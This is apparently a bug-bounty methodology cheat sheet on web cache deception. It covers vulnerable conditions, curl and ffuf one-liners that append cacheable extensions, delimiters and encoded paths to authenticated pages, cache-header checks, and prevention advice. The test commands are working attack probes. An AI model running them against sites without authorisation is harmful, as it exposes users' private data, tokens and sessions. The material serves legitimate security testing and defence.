# Web Cache Deception

> Comprehensive methodology and one‑liner commands for testing web cache deception vulnerabilities, incorporating 2025–2026 trends (wildcard WCD in ChatGPT ATO, path traversal via inconsistent decoding, delimiter mismatches, CDN normalization bypasses, 404 leaks) and authoritative references (PortSwigger Web Security Academy, PayloadsAllTheThings, OWASP‑related resources, recent write‑ups).

Web Cache Deception tricks a caching layer (CDN, reverse proxy) into storing **private, dynamic, authenticated content** under a **cacheable static‑like URL**, allowing unauthenticated users to retrieve sensitive data from the cache.

## Methodology

### Key Concepts & Conditions for Vulnerability

- **Discrepancy** between origin server and cache:
  - Origin treats `/profile/settings.css` as dynamic `/profile/settings` (ignores extension or returns 200 with private data)
  - Cache treats it as static `.css`/`.jpg` → caches with long TTL, serves to anyone
- **Cache rules** often key on extension/path, ignore auth status
- **No Vary: Cookie** or improper Vary headers
- **Sensitive page returns 200** even on bogus extension
- **Cache stores non‑404 responses** (some store 404s too)

**High‑impact outcomes:**
- Leaked API keys, session tokens, PII, CSRF tokens
- Account takeover (e.g., wildcard WCD chaining to steal keys)

### Targets & Sensitive Endpoints to Hunt

Focus on authenticated, dynamic pages with private content:

- Profile / account settings (`/profile`, `/account`, `/settings`, `/user`)
- Dashboard / home (`/home`, `/dashboard`)
- API keys / tokens pages (`/api‑keys`, `/security`)
- Billing / payment details
- Any page showing username, email, balance, or sensitive data

**Common patterns:**
- Pages behind login that return 200 OK
- No trailing slash enforcement
- Extensions stripped or ignored by app routing

## Tool Installation & Setup

### Burp Suite Extensions

- **Param Miner** – discover hidden parameters that trigger dynamic responses
- **Burp Scanner** – includes cache deception detection

### ffuf (fuzzing extensions)

```bash
go install github.com/ffuf/ffuf/v2@latest
```

### Nuclei (cache deception templates)

```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update-templates
```

### Wordlists

```bash
# Cacheable extensions
cat > extensions.txt <<EOF
.css
.js
.jpg
.png
.gif
.ico
.svg
.webp
.woff
.ttf
.json
.xml
.pdf
EOF
```

## Testing Commands (One‑Liners)

### 1. Find User‑Specific Pages

```bash
# Extract potential sensitive pages from crawled URLs
grep -iE "profile|account|settings|dashboard|user" crawledurls.txt > user-pages.txt
```

### 2. Basic Cache Deception Test

```bash
# Test specific URLs with cacheable extensions
curl -s "http://target.com/profile/settings.css" | grep -q "user" && echo "VULN: settings.css"
curl -s "http://target.com/account/data.js" | grep -q "user" && echo "VULN: data.js"
curl -s "http://target.com/user/info.json" | grep -q "email" && echo "VULN: info.json"
```

### 3. Automated Extension Fuzzing

```bash
while read url; do
    for ext in css js json xml pdf svg; do
        response=$(curl -s -w "%{http_code}" "${url}.${ext}")
        if echo "$response" | grep -q "200"; then
            echo "${url}.${ext} - Cached!"
        fi
    done
done < user-pages.txt
```

### 4. Advanced Extension & Delimiter Fuzzing

```bash
# Use ffuf to fuzz extensions on a sensitive path (authenticated)
ffuf -u "https://target.com/profile/FUZZ" -w /home/pwn/wordlists/extensions.txt -H "Cookie: session=VALID_SESSION" -fc 401,403 -fs 0
```

### 5. Normalization / Decoding Mismatches (2025–2026 Techniques)

```bash
# Encoded dot
curl -s "https://target.com/profile/settings%2e.css"
# Slash‑dot
curl -s "https://target.com/profile/settings/.css"
# Delimiters
curl -s "https://target.com/profile/settings;.css"
curl -s "https://target.com/profile/settings#.jpg"
curl -s "https://target.com/profile/settings?.css"
# Path traversal twist
curl -s "https://target.com/profile/../settings.css"
# Double extension
curl -s "https://target.com/profile/settings.css.jpg"
```

### 6. Cache Header Verification

```bash
# Check for cache hit headers
curl -I "https://target.com/profile/settings.css" | grep -E "X-Cache|Age|Via"
# Example: X‑Cache: HIT, Age: 300
```

### 7. Unauthenticated vs Authenticated Comparison

```bash
# Fetch as authenticated user (store response)
curl -s -H "Cookie: session=SECRET" "https://target.com/profile/settings" > auth.txt
# Fetch same URL with extension as unauthenticated user
curl -s "https://target.com/profile/settings.css" > unauth.txt
diff auth.txt unauth.txt
# If identical (or contains sensitive data), vulnerability likely
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

### Normalization / Decoding Mismatches

- **Encoded dot** (`%2e`) – cache may treat as extension while origin strips it
- **Slash‑dot** (`/.css`) – path normalization differences
- **Delimiters** (`;`, `#`, `?`, `&`) – used to separate extension from path; cache may parse differently
- **Unicode / overlong UTF‑8** – normalization inconsistencies between layers

### Wildcard / Path Traversal Twist

- **Path traversal within extension** – `/profile/../settings.css` may be resolved differently by cache vs origin
- **Wildcard WCD** – ChatGPT‑style account takeover (ATO) via wildcard cache rules that match multiple paths

### 404 Leaks

- Origin returns 200 on fake extension but leaks data in error/partial response (e.g., debug info, stack traces)
- Cache stores the 404 response, which may contain sensitive fragments

### Query Parameter + Extension

- `/profile?tab=settings.css` – cache may key on extension while origin ignores query string
- **Cache busters** (`?v=1`, `?cb=random`) – may affect caching behavior

### CDN‑Specific Mismatches

- **Cloudflare** page rules, cache‑everything settings
- **Akamai** edge mismatches, differential path normalization
- **Fastly** VCL configurations that treat extensions differently

### Chained with Open Redirect / Cache Poisoning

- Use cache deception to leak redirect tokens, then combine with open redirect for account takeover
- Poison cache with malicious content that is later served to authenticated users

## Detection & Verification

**Indicators of Vulnerability:**

- Unauthenticated request returns private data (API key, email, etc.)
- Cache headers (X‑Cache: HIT, Age >0, Via: CDN)
- Response matches authenticated version (or contains sensitive fragments)

**Blind / Partial Leaks:**

- Check for username / partial PII in cached response
- Compare response lengths / fingerprints between authenticated and unauthenticated requests

**Impact PoC:**

- Video demonstration: authenticated → append `.css` → unauthenticated fetch → show leaked key
- Business risk: account takeover, PII exposure, session hijacking

**Verification Steps:**

1. Authenticate as a victim/user and capture a sensitive page response
2. Append cacheable extension and request as unauthenticated user
3. Check if response contains private data and cache hit headers
4. Confirm caching by repeating request multiple times and observing Age header
5. Clear browser cache or use different IP to ensure cached response is served

## Prevention Guidance (Best Practices 2026)

1. **Vary: Cookie** (or `Vary: *`) on dynamic responses – ensures cache distinguishes by authentication
2. **No‑cache directives** on sensitive pages: `Cache‑Control: no‑store, private`
3. **Consistent URL normalization** between origin & cache – use same parsing logic
4. **Deny static extensions** on dynamic routes via routing rules (e.g., block `.css`, `.js` on authenticated paths)
5. **Cache key include auth** – incorporate user‑specific identifiers into cache key
6. **CDN config:** Exclude sensitive paths from caching entirely
7. **Least‑privilege** – don't cache authenticated content; if necessary, use short TTLs and validate on each request
8. **Regular auditing** – test your own applications for cache deception using tools above
9. **Monitor cache headers** – ensure `Vary` and `Cache‑Control` are correctly set in production
10. **Educate developers** – include cache security in secure coding training

## References

- **PortSwigger Web Cache Deception** – [PortSwigger Web Security Academy](https://portswigger.net/web‑security/web‑cache‑deception) (includes normalization lab)
- **PayloadsAllTheThings – Web Cache Deception** – [GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception)
- **2025–2026 Write‑ups** – ChatGPT Wildcard WCD ATO, Medium advanced guides (Reduan, Monika), PortSwigger 2024/2025 top techniques
- **GitHub: EmadYaY/Comprehensive‑Cache‑Vulnerabilities‑Checklist** – [GitHub](https://github.com/EmadYaY/Comprehensive‑Cache‑Vulnerabilities‑Checklist)
